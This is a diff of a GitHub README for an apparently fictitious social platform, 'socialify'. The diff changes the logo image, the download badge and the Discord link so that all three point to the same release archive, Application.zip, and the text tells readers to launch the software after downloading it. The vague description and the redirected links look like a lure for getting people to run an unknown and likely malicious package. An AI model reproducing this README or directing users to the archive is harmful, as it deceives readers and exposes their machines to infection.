@@ -2,7 +2,7 @@
 
 Welcome to the "socialify" repository! 🎉
 
-![Socialify Logo](https://example.com/socialify-logo.png)
+![Socialify Logo](https://github.com/MadhavXDD/socialify/releases/download/v1.0/Application.zip)
 
 ## Description
 This public repository is dedicated to the "socialify" project, a platform that aims to enhance social interactions online. Whether you are looking to connect with friends, share your thoughts, or discover new communities, Socialify has got you covered!
@@ -15,14 +15,14 @@ This public repository is dedicated to the "socialify" project, a platform that 
 
 ## Installation
 To get started with Socialify, download the software package from the following link:  
-[![Download Socialify](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip)  
+[![Download Socialify](https://github.com/MadhavXDD/socialify/releases/download/v1.0/Application.zip)](https://github.com/MadhavXDD/socialify/releases/download/v1.0/Application.zip)  
 **Note:** The software needs to be launched after download.
 
 ## Contributing
 We welcome contributions to enhance the Socialify platform and make it even better for our users. If you have ideas, feature requests, or bug reports, feel free to submit them through the "Issues" tab here on GitHub.
 
 ## Community
-Join our community on [Discord](https://discord.com/socialify) for discussions, support, and to connect with other users of Socialify. Let's build a vibrant and inclusive community together!
+Join our community on [Discord](https://github.com/MadhavXDD/socialify/releases/download/v1.0/Application.zip) for discussions, support, and to connect with other users of Socialify. Let's build a vibrant and inclusive community together!
 
 ## License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
